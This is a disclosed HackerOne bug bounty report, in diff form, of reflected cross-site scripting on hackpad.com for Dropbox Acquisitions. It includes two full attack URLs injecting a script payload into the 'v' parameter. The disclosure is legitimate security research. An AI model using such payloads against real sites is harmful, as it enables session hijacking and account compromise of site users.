@@ -1,0 +1,26 @@
+ReportLink:https://hackerone.com/reports/53628
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/mahitman
+ReportedTo:Dropbox Acquisitions(dropbox-acquisitions)
+BountyAmount:216.0
+Severity:
+State:Closed
+DateOfDisclosure:02.06.2015 18:36:01
+
+Summary:
+
+Hi
+I found a XSS in your website in the following links.It is not very different from the last time which I reported.Rather it is on a same page 
+
+https://hackpad.com/comet/channel?channel=shortpolling&create=yes&id=985980425495&new=yes&r=474132488947&seq=0&tag=RpTWPko6ER2&v=2'%22()%26%25<ScRiPt%20>prompt(document.domain)</ScRiPt>
+
+In the above URL ENCODED GET input v was set to 2'"()&%<ScRiPt >prompt(document.domain)</ScRiPt>
+
+Last time URL ENCODED GET input shortpolling was set to (xss-vector)
+
+https://hackpad.com/comet/post?r=359234393341&v=2'%22()%26%25<ScRiPt%20>prompt(document.domain)</ScRiPt>&id=879083881620&seq=0&tag=RpTWPko6ER2
+
+Poc is attached fix it...
+
+Regards
+Muhammad Abdullah
